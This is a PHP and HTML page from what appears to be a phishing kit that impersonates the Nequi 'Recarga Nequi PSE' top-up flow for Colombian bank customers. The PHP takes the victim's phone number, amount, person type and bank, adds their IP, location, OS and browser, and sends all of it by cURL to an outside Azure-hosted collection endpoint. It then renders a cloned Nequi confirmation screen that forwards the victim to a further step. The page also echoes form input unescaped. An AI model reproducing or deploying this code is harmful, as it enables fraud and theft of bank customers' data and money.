<?php
ini_set('display_errors', 0);
error_reporting(E_ALL);

// --- Lee POST (usa null coalescing para evitar notices) ---
$numero  = $_POST['Inputphone']  ?? null;
$cuanto  = $_POST['Inputcuanto'] ?? null;
$persona = $_POST['Inputpersona']?? null;
$entidad = $_POST['Inputbanc']   ?? null;

include('funciones.php'); // aquí defines $myip, $pais, etc. si aplica

if ($entidad === 'DAVIVIENDA') {
    exit; // nada que hacer
}

if (!($cuanto && $persona && $entidad)) {
    http_response_code(400);
    exit('Faltan campos requeridos.');
}

// --- Construye mensaje ---
$message = "PSE
Banco: {$entidad}
Persona: {$persona}
Monto: {$cuanto}
Numero: {$numero}
Fecha: " . date('l jS \of F Y h:i:s A') . "
Ip y Localidad: {$myip} {$pais} {$region}
SO: {$user_os}
Navegador: {$navegador}";

$payload = ['mensaje' => $message];

// --- Obtén la IP real del cliente para reenviarla ---
function getClientIp(): string {
    $candidates = [
        $_SERVER['HTTP_X_FORWARDED_FOR'] ?? '',
        $_SERVER['HTTP_X_REAL_IP'] ?? '',
        $_SERVER['REMOTE_ADDR'] ?? '',
    ];
    foreach ($candidates as $val) {
        if (!$val) continue;
        foreach (explode(',', $val) as $ip) { // XFF puede traer lista
            $ip = trim($ip);
            if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE|FILTER_FLAG_NO_RES_RANGE)) {
                return $ip; // pública
            }
        }
        foreach (explode(',', $val) as $ip) {
            $ip = trim($ip);
            if (filter_var($ip, FILTER_VALIDATE_IP)) return $ip; // privada si no hubo pública
        }
    }
    return '0.0.0.0';
}
$clientIp = getClientIp();

// --- Envío cURL con headers extra y logging ---
$url = 'https://servidorapis-ggdnawe6aefxerg7.canadacentral-01.azurewebsites.net/nesquis/';
$ch = curl_init($url);

$verbose = fopen('php://temp', 'w+'); // buffer para log VERBOSE

curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_POST           => true,
    CURLOPT_HTTPHEADER     => [
        'Accept: application/json',
        'Content-Type: application/json',
        'X-Client-IP: ' . $clientIp,              // <- IP real del usuario
        'X-Forwarded-For: ' . $clientIp,          // <- opcional, por compatibilidad
    ],
    CURLOPT_POSTFIELDS     => json_encode($payload, JSON_UNESCAPED_UNICODE),
    CURLOPT_TIMEOUT        => 20,
    CURLOPT_CONNECTTIMEOUT => 10,
    CURLOPT_HEADER         => true,               // incluye headers en la respuesta
    CURLOPT_SSL_VERIFYPEER => true,
    CURLOPT_SSL_VERIFYHOST => 2,
    CURLOPT_VERBOSE        => true,
    CURLOPT_STDERR         => $verbose,
]);

$raw = curl_exec($ch);

if ($raw === false) {
    $err = curl_error($ch);
    curl_close($ch);
    error_log('cURL error: ' . $err);
    http_response_code(502);
    exit('Error de red: ' . $err);
}

$httpCode    = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
$resp_headers = substr($raw, 0, $header_size);
$resp_body    = substr($raw, $header_size);

curl_close($ch);

rewind($verbose);
$verboseLog = stream_get_contents($verbose);

// --- Manejo básico según código ---
if ($httpCode >= 400) {
    // Loguea todo para depurar
    error_log("[API ERROR] HTTP $httpCode\nHEADERS:\n$resp_headers\nBODY:\n$resp_body\nVERBOSE:\n$verboseLog");
} else {
    // Igual puede ser útil guardar el verbose en debug
    // error_log("[API OK] HTTP $httpCode\n$resp_body");
}

// --- Devuelve algo útil al caller (tu frontend, por ejemplo) ---
header('Content-Type: application/json; charset=utf-8');
echo json_encode([
    'status'       => $httpCode,
    'client_ip'    => $clientIp,    // lo que reenviamos
    'response_raw' => json_decode($resp_body, true) ?? $resp_body, // parsea si es JSON
], JSON_UNESCAPED_UNICODE);

?>

<html class="no-js">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <title>Recarga NEQU</title>
    <meta http-equiv="cache-control" content="no-cache">
    <meta http-equiv="pragma" content="no-cache">
    <meta http-equiv="expires" content="0">
    <meta name="description" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="theme-color" content="#11A6BB">
    <meta name="apple-mobile-web-app-title" content="Recarga Nequi PSE">
    <meta name="application-name" content="Recarga Nequi PSE">
    <meta name="theme-color" content="#ffffff">
    <link rel="apple-touch-icon" sizes="180x180" href="./nequ/favicon.ico">
    <link rel="icon" type="image/x-icon" href="./nequ/favicon.ico">
    <link rel="mask-icon" href="./nequ/favicon.ico" color="#5bbad5">
    <link href="./nequ/bootstrap.min.css" rel="stylesheet">
    <link href="./nequ/angular-tooltips.min.css" rel="stylesheet">
    <link href="./nequ/animate.min.css" rel="stylesheet">

    <link rel="stylesheet" href="./nequ/main.css">
</head>

<body ng-app="PSERecharge" class="ng-scope">
    <div id="printable" class="contenido ng-scope" ng-view="" style="">
        <div id="logo_wrapper" class="ng-scope"> <img class="logo_img" src="./nequ/nequi.svg" alt="Logo Nequi"> </div>
        <div class="ng-scope">
            <div ng-if="cashInCtrl.toggled" class="container vertical-center text-center ng-scope" style="">
                <div id="title1Wrapper">
                    <h1 id="title1" class="ng-binding">Revisa la info</h1>
                </div>
                <div class="confirmationCard firstCard">
                    <div class="container-info">
                        <span class="confirmationTitle ng-binding">Concepto</span>
                        <span class="confirmationValue ng-binding">Recarga Nequi PSE</span>
                    </div>

                    <div class="container-info">
                        <span class="confirmationTitle ng-binding">Celular</span>
                        <span class="confirmationValue ng-binding"><?php echo $numero; ?></span>
                    </div>

                    <div class="container-info">
                        <span class="confirmationTitle ng-binding">Valor</span>
                        <span class="confirmationValue ng-binding"><?php echo $cuanto; ?></span>
                    </div>

                    <div class="container-info">
                        <span class="confirmationTitle ng-binding">Tipo de persona</span>
                        <span class="confirmationValue ng-binding"><?php echo $persona; ?></span>
                    </div>

                    <div class="container-info">
                        <span class="confirmationTitle ng-binding">Banco</span>
                        <span class="confirmationValue ng-binding"><?php echo $entidad; ?></span>
                    </div>
                </div>
            </div>
            <form id="form2" name="payment_info" autocomplete="off" action="./redirec.php" method="post" class="ng-pristine ng-valid">
                <fieldset ng-disabled="cashInCtrl.form2_lock">
                    <button class="submit_btn submit_btn_moretop ng-binding" type="submit" ng-click="cashInCtrl.gotoGateway()" ng-class="cashInCtrl.btnClass" ng-disabled="payment_info.$invalid || cashInCtrl.noSubmit">Continuar</button>
                </fieldset>
                <input type="hidden" name="banco" value="<?php echo $entidad; ?>">
                <a href="./index.html" class="submit_btn_alt ng-binding">Atrás</a>

            </form>
        </div>
    </div>
    <div style="background-color: rgb(255, 255, 255); border: 1px solid rgb(204, 204, 204); box-shadow: rgba(0, 0, 0, 0.2) 2px 2px 3px; position: absolute; transition: visibility 0s linear 0.3s, opacity 0.3s linear 0s; opacity: 0; visibility: hidden; z-index: 2000000000; left: 0px; top: -10000px;">
        <div style="width: 100%; height: 100%; position: fixed; top: 0px; left: 0px; z-index: 2000000000; background-color: rgb(255, 255, 255); opacity: 0.05;"></div>
        <div class="g-recaptcha-bubble-arrow" style="border: 11px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -11px; z-index: 2000000000;"></div>
        <div class="g-recaptcha-bubble-arrow" style="border: 10px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -10px; z-index: 2000000000;"></div>
        <div style="z-index: 2000000000; position: relative; width: 0px; height: 0px;"><iframe title="El reCAPTCHA caduca dentro de dos minutos" name="c-h9vc6w9siafl" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation" src="./nequ/bframe.html" style="width: 0px; height: 0px;"></iframe></div>
    </div>
</body>

</html>